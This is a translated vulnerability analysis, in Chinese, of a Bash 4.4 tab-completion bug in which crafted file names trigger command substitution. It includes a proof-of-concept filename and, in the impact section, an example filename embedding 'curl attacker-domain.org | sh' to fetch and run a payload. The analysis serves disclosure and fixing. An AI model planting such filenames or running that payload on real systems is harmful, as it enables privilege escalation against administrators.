# 【漏洞分析】GNU Bash路径补全功能中的代码执行漏洞

## 译文声明
本文为翻译文章，原文来源：raw.githubusercontent.com  
原文地址：[链接](http://git.savannah.gnu.org/cgit/bash.git/commit/?h=devel&id=74b8cbb41398b4453d8ba04d0cdd1b25f9dcb9e3)  
译文仅供参考，具体内容及含义以原文为准。

**翻译者**：胖胖秦  
**预估稿费**：100 RMB  
**投稿方式**：发送邮件至 [linwei@360.cn](mailto:linwei@360.cn)，或登录 [网页版](http://bobao.360.cn/contribute/index) 在线投稿

---

## 引言
从版本4.4开始，GNU Bash的路径补全功能存在两个bug，这些bug可以触发一个代码执行漏洞。通过创建具有特定名称的文件或目录可以触发此漏洞。用户可以通过按Tab键使用GNU Bash的内置路径完成功能（如使用`rm`命令删除文件）来触发该漏洞，但不会直接执行命令本身。此漏洞在2015年五月被引入到开发分支中。

## 描述
如果创建一个包含双引号（"）的文件名，且该双引号符合GNU Bash的内置命令替换功能（`'``'` 或 `$()`），则会触发该漏洞。双引号不需要闭合。当用户尝试使用自动补全功能时，命令将被执行（前提是文件名不包含斜杠（/）字符）：

```bash
[heyens@beowulf] $ touch '" ' touch HereBeDragons ' '
[heyens@beowulf] $ ls -lt
insgesamt 0
-rw-r--r-- 1 heyens heyens 0 17. Jan 16:03 '" ' touch HereBeDragons ' '
[heyens@beowulf] $ rm " touch HereBeDragons
^C
[heyens@beowulf] $ ls -lt
insgesamt 0
-rw-r--r-- 1 heyens heyens 0 17. Jan 16:04 HereBeDragons
-rw-r--r-- 1 heyens heyens 0 17. Jan 16:03 '" ' touch HereBeDragons ' '
```

## 原因
该漏洞在提交 `74b8cbb41398b4453d8ba04d0cdd1b25f9dcb9e3` 中被引入，并插入到4.4稳定版中。以下是相关代码片段：

### `dirname` 的去双引号
在 `filename_stat_hook` 函数中，之前检查文件是否存在的代码是内联的。在提交的版本中，使用了 `directory_exists` 函数来替代这个检查（`bashline.c` 也包含这个检查）：

```c
3121 else if (t = mbschr(local_dirname, '\'')) /* XXX */
3122 should_expand_dirname = '\'';
3123 
3124 if (should_expand_dirname && directory_exists(local_dirname))
3125 should_expand_dirname = 0;
3126 
3127 if (should_expand_dirname)
3128 {
3129 new_dirname = savestring(local_dirname);
3130 wl = expand_prompt_string(new_dirname, 0, WNOCOMSUB); /* does the right thing */
```

跟随这个调用，我们发现 `dirname` 参数被去引号了。然后，当文件名被补齐时，引号已经被移除。

```c
3092 /* First, dequote the directory name */
3093 new_dirname = bash_dequote_filename(dirname, rl_completion_quote_character);
3094 dirlen = STRLEN(new_dirname);
3095 if (new_dirname[dirlen - 1] == '/')
3096 new_dirname[dirlen - 1] = '\0';
3097 #if defined(HAVE_LSTAT)
3098 r = lstat(new_dirname, &sb) == 0;
3099 #else
3100 r = stat(new_dirname, &sb) == 0;
3101 #endif
3102 free(new_dirname);
3103 return (r);
```

本质上，这意味着如果 `dirname` 中包含双引号，在 `directory_exists` 函数内部会移除这个双引号，这发生在 `lstat` 调用之前。考虑到原始输入，这意味着 `dirname` 包含 `'foo'`。在这种情况下，函数返回0，因为没有相关文件存在。

返回之前的函数，我们发现在这种情况下，`should_expand_dirname` 不为零，`expand_prompt_string` 函数使用目录名来调用（第3130行）。在我们的案例中会发生以下情况：显示文件未找到，我们包含一个单引号在路径中。然而，正确的参数被传递以确保不应该发生命令替换（`WNOCOMSUB`）。该函数主要传递参数给 `expand_word_internal` 函数（`subst.c:8601`），但它并没有正确处理。

### `expand_word_internal` 不转发 `Flags` 字段
通过查看 `expand_word_internal` 函数的源码，我们发现有不同情况来处理引号字符串。我们看看下面的代码段，从 `subst.c:9009` 开始：

```c
9009 case '"':
9010 if ((quoted & (Q_DOUBLE_QUOTES | Q_HERE_DOCUMENT)) && ((quoted & Q_ARITH) == 0))
9011 goto add_character;
9012 
9013 t_index = ++sindex;
9014 temp = string_extract_double_quoted(string, &sindex, 0);
9015 
9016 /* If the quotes surrounded the entire string, then the
9017 whole word was quoted. */
9018 quoted_state = (t_index == 1 && string[sindex] == '\0')
9019 ? WHOLLY_QUOTED
9020 : PARTIALLY_QUOTED;
9021 
9022 if (temp && *temp)
9023 {
9024 tword = alloc_word_desc();
9025 tword->word = temp;
9026 
9027 temp = (char *)NULL;
9028 
9029 temp_has_dollar_at = 0; /* XXX */
9030 /* Need to get W_HASQUOTEDNULL flag through this function. */
9031 list = expand_word_internal(tword, Q_DOUBLE_QUOTES, 0, &temp_has_dollar_at, (int *)NULL);
```

在第9014行中，提取开放（闭合是可选的）引号之间的所有信息。在第9024行申请一个新的 `WORD_DESC` 结构。相关联的 `word` 字段会作相应的设置，但从未设置 `flags` 字段。本质上，即使 `WNOCOMSUB` 被设置为原始字符串，在新创建的字符串中也不会处理标志。在第9031行中，递归调用 `expand_word_internal` 函数。但是，在这种情况下，将传递 `'foo'` 并且没有任何限制进行命令替换，这将导致攻击者的命令被执行，执行权限取决于运行 Bash 的用户。

## 影响
我们认为这个错误的影响非常高。假设攻击者在系统上没有权限，他可以释放一个具有特定名称的文件到某个目录中，并等待管理员触发漏洞以提升权限。尽管该漏洞不允许在文件名中包含斜杠，但这对漏洞利用影响不大。例如：

```bash
some-very-long-string-nobody-is-going-to-type" 'curl attacker-domain.org | sh'
```

## 可能的修复
这个问题与两个不同的错误有关。由于缺乏更深层次的代码知识，我们只能猜测，在递归调用 `expand_word_internal` 函数时传递标志可能会修复这个漏洞。此外，在 `directory_exists` 函数中去引号并结合已去引号的字符串也可以修复这个漏洞。

## 参考资料
[1] GNU项目。GNU Bash在Savannah git（开发分支）。访问地址：[链接](http://git.savannah.gnu.org/cgit/bash.git/commit/?h=devel&id=74b8cbb41398b4453d8ba04d0cdd1b25f9dcb9e3)。访问日期：2017-01-17。